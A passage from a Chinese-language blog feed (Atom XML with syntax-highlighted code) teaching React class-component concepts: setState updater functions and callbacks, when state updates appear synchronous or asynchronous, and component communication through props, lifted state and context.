class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState串联更新数据&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>调用setState后页面更新后执行逻辑写法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,()=&gt;&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">'更新后：'</span>, <span class="keyword">this</span>.state.count)  <span class="comment">// 打印：1</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'未更新：'</span>, <span class="keyword">this</span>.state.count)  <span class="comment">// 打印：0</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState更新后执行逻辑&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><ul><li>使用 <code>setState((prevState) =&gt; {})</code> 语法，可以解决多次调用状态依赖问题</li><li>使用 <code>setState(updater[, callback])</code> 语法，在状态更新（页面完成重新渲染）后立即执行某个操作</li></ul><h2 id="setState扩展-异步OR同步"><a href="#setState扩展-异步OR同步" class="headerlink" title="setState扩展 - 异步OR同步"></a>setState扩展 - 异步OR同步</h2><p>在react类组件中，多次的setState并不会立刻执行，而是合并成一个来执行。</p><ul><li>setState本身并不是一个异步方法，其之所以会表现出一种“异步”的形式，是因为react框架本身的一个性能优化机制</li><li>React会将多个setState的调用合并为一个来执行，也就是说，当执行setState的时候，state中的数据并不会马上更新</li></ul><p><strong>知道何时出现“异步”，知道何时出现同步</strong> </p><ul><li>setState如果是在react的生命周期中或者是事件处理函数中，表现出来为：延迟合并更新（“异步更新”）</li><li>setState如果是在<strong>setTimeout/setInterval</strong>或者原生事件中，表现出来是：立即更新（“同步更新”）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 合成事件的处理函数 or 生命周期构造函数</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// 表现异步</span></span><br><span class="line"> </span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 表现同步</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'render'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;同步OR异步&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;props-类型校验&quot;&gt;&lt;a href=&quot;#props-类型校验&quot; class=&quot;headerlink&quot; title=&quot;props - 类型校验&quot;&gt;&lt;/a&gt;props - 类型校验&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;理解props都是外来的，在使用的时候如果数据类型不对，
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件高级" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E9%AB%98%E7%BA%A7/"/>
    
      <category term="React组件进阶" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E8%BF%9B%E9%98%B6/"/>
    
      <category term="props校验" scheme="//www.shen.ee/tags/props%E6%A0%A1%E9%AA%8C/"/>
    
      <category term="React生命周期" scheme="//www.shen.ee/tags/React%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    
      <category term="props默认值" scheme="//www.shen.ee/tags/props%E9%BB%98%E8%AE%A4%E5%80%BC/"/>
    
  </entry>
  
  <entry>
    <title>React组件通讯</title>
    <link href="//www.shen.ee/article/50340.html"/>
    <id>//www.shen.ee/article/50340.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="组件通讯-概念"><a href="#组件通讯-概念" class="headerlink" title="组件通讯-概念"></a>组件通讯-概念</h2><blockquote><p>组件状态是独立的，组件化之后涉及状态同步，需要进行组件通讯</p></blockquote><h3 id="组件的特点"><a href="#组件的特点" class="headerlink" title="组件的特点"></a>组件的特点</h3><ul><li>组件是<strong><code>独立且封闭</code></strong>的单元，默认情况下，只能使用组件自己的数据</li><li>在组件化过程中，通常会将一个完整的功能拆分成多个组件，以更好的完成整个应用的功能</li></ul><h3 id="组件通讯意义"><a href="#组件通讯意义" class="headerlink" title="组件通讯意义"></a>组件通讯意义</h3><ul><li>而在这个过程中，多个组件之间不可避免的要<code>共享</code>某些数据</li><li>为了实现这些功能，就需要打破组件的独立封闭性，让其与外界沟通</li><li>这个过程就是<strong>组件通讯</strong></li></ul><h2 id="props-基本使用"><a href="#props-基本使用" class="headerlink" title="props 基本使用"></a>props 基本使用</h2><h3 id="传递数据和接收数据的过程"><a href="#传递数据和接收数据的过程" class="headerlink" title="传递数据和接收数据的过程"></a>传递数据和接收数据的过程</h3><ul><li>使用组件的时候通过属性绑定数据，在组件内部通过 props 获取即可。</li></ul><h3 id="函数组件使用-props"><a href="#函数组件使用-props" class="headerlink" title="函数组件使用 props"></a>函数组件使用 props</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用组件</span><br><span class="line"><span class="tag">&lt;<span class="name">Hello</span> <span class="attr">name</span>=<span class="string">"jack"</span> <span class="attr">age</span>=<span class="string">"20"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义组件 props包含&#123;name:'jack',age:'20'&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hello</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>接收到数据:&#123;props.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类组件使用-props"><a href="#类组件使用-props" class="headerlink" title="类组件使用 props"></a>类组件使用 props</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用组件</span><br><span class="line"><span class="tag">&lt;<span class="name">Hello</span> <span class="attr">name</span>=<span class="string">"jack"</span> <span class="attr">age</span>=<span class="string">"20"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义组件 props包含&#123;name:'jack',age:'20'&#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>接收到的数据:&#123;this.props.age&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="props-注意事项"><a href="#props-注意事项" class="headerlink" title="props 注意事项"></a>props 注意事项</h2><h3 id="什么是单向数据流"><a href="#什么是单向数据流" class="headerlink" title="什么是单向数据流"></a>什么是单向数据流</h3><ul><li>单向数据流，是从上到下的，<code>自顶而下</code>的，数据流。</li><li>好比：河流，瀑布，只能从上往下流动，上游污染下游受影响，但是下游不能影响上游。</li><li>父组件传递数据给子组件，父组件更新数据子组件自动接收更新后数据，但是子组件是不能修改数据的。</li></ul><h3 id="props-可以传递什么数据？"><a href="#props-可以传递什么数据？" class="headerlink" title="props 可以传递什么数据？"></a>props 可以传递什么数据？</h3><ul><li>字符串</li><li>数字</li><li>布尔</li><li>数组</li><li>对象</li><li>函数</li><li>JSX （插槽）</li><li>…任意</li></ul><h2 id="父传子方式"><a href="#父传子方式" class="headerlink" title="父传子方式"></a>父传子方式</h2><p>大致步骤：</p><ul><li>父组件提供要传递的 state 数据</li><li>给子组件标签添加属性，值为 state 中的数据</li><li>子组件中通过 props 接收父组件中传递的数据</li></ul><h3 id="父组件提供要传递的-state-数据"><a href="#父组件提供要传递的-state-数据" class="headerlink" title="父组件提供要传递的 state 数据"></a>父组件提供要传递的 state 数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="给子组件标签添加属性，值为-state-中的数据"><a href="#给子组件标签添加属性，值为-state-中的数据" class="headerlink" title="给子组件标签添加属性，值为 state 中的数据"></a>给子组件标签添加属性，值为 state 中的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">+        &lt;Child money=&#123;this.state.money&#125; /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="子组件中通过-props-接收父组件中传递的数据"><a href="#子组件中通过-props-接收父组件中传递的数据" class="headerlink" title="子组件中通过 props 接收父组件中传递的数据"></a>子组件中通过 props 接收父组件中传递的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h3&gt;子组件：&#123;props.money&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="子传父方式"><a href="#子传父方式" class="headerlink" title="子传父方式"></a>子传父方式</h2><ul><li>父组件提供回调函数，通过 props 传递给子组件</li><li>子组件调用 props 中的回调函数，函数可传参</li><li>父组件函数的参数就是子组件传递的数据</li></ul><h3 id="父组件"><a href="#父组件" class="headerlink" title="父组件"></a>父组件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 回调函数</span></span><br><span class="line">  buyPhone = <span class="function">(<span class="params">price</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      money: <span class="keyword">this</span>.state.money - price,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; money &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Child money=&#123;money&#125; buyPhone=&#123;this.buyPhone&#125; /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="子组件"><a href="#子组件" class="headerlink" title="子组件"></a>子组件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Child = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 子组件调用父组件传递过来的回调函数</span></span><br><span class="line">    props.buyPhone(<span class="number">5000</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h3&gt;子组件：&#123;props.money&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;handleClick&#125;&gt;买手机&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h2 id="兄弟组件通讯"><a href="#兄弟组件通讯" class="headerlink" title="兄弟组件通讯"></a>兄弟组件通讯</h2><blockquote><p>通过状态提升思想完成兄弟组件数据通讯</p></blockquote><p>状态提升思想是什么？</p><ul><li>将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态和修改状态的方法</li><li>需要通讯的组件通过 props 接收状态和函数即可</li></ul><p><img src="https://oss.iyouhun.com/img/md/1638944148017.c33b506e.png" alt="1638944148017.c33b506e"></p><p>参考代码：</p><p><code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 导入两个子组件</span></span><br><span class="line"><span class="keyword">import</span> Jack <span class="keyword">from</span> <span class="string">'./Jack'</span>;</span><br><span class="line"><span class="keyword">import</span> Rose <span class="keyword">from</span> <span class="string">'./Rose'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// App 是父组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 1. 状态提升到父组件</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    msg: <span class="string">''</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeMsg = <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; msg &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;我是App组件&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &#123;/</span>* 兄弟组件 <span class="number">1</span> *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">        &lt;Jack changeMsg=&#123;this.changeMsg&#125;&gt;&lt;/</span>Jack&gt;</span><br><span class="line">        &#123;<span class="comment">/* 兄弟组件 2 */</span>&#125;</span><br><span class="line">        &lt;Rose msg=&#123;<span class="keyword">this</span>.state.msg&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Rose</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染组件</span></span><br><span class="line"><span class="regexp">ReactDOM.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p><code>Jack.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Jack</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  say = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.props.changeMsg(<span class="string">'you jump i look'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h3&gt;我是Jack组件&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.say&#125;&gt;说&lt;/</span>button&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><code>Rose.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Rose</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h3&gt;我是Rose组件-&#123;<span class="keyword">this</span>.props.msg&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="context-跨级组件通讯"><a href="#context-跨级组件通讯" class="headerlink" title="context 跨级组件通讯"></a>context 跨级组件通讯</h2><h3 id="什么是跨级组件通讯？"><a href="#什么是跨级组件通讯？" class="headerlink" title="什么是跨级组件通讯？"></a>什么是跨级组件通讯？</h3><ul><li>组件间相隔多层，理解成叔侄，甚至更远的亲戚。</li></ul><h3 id="context-怎么去理解？"><a href="#context-怎么去理解？" class="headerlink" title="context 怎么去理解？"></a>context 怎么去理解？</h3><ul><li>术语：上下文</li><li>理解：一个范围，只要在这个范围内，就可以跨级组件通讯。（不需要 props 层层传递）</li></ul><p><img src="https://oss.iyouhun.com/img/md/1638932620946.11b91fb0.png" alt="1638932620946.11b91fb0"></p><h3 id="context-使用方法"><a href="#context-使用方法" class="headerlink" title="context 使用方法"></a>context 使用方法</h3><ul><li>创建上下文</li></ul><p><code>context.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext &#125; <span class="keyword">from</span> <span class="string">'react'</span> <span class="comment">// 引入创建上下文的方法</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createContext(初始值) <span class="comment">// 初始值会在找不到Provider提供者时生效</span></span><br></pre></td></tr></table></figure><ul><li>使用上下文的Provider组件作为提供者</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// Provider包裹确定上下文生效范围，value注入范围内可用的数据</span></span><br><span class="line">  &lt;Context.Provider value=&#123;context共享的值&#125;&gt;</span><br><span class="line">        ....子孙组件</span><br><span class="line">   &lt;<span class="regexp">/Context.Provider&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>使上下文的Consumer作为消费者</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;Context.Consumer&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        value =&gt; JSX</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;<span class="regexp">/Context.Consumer&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span 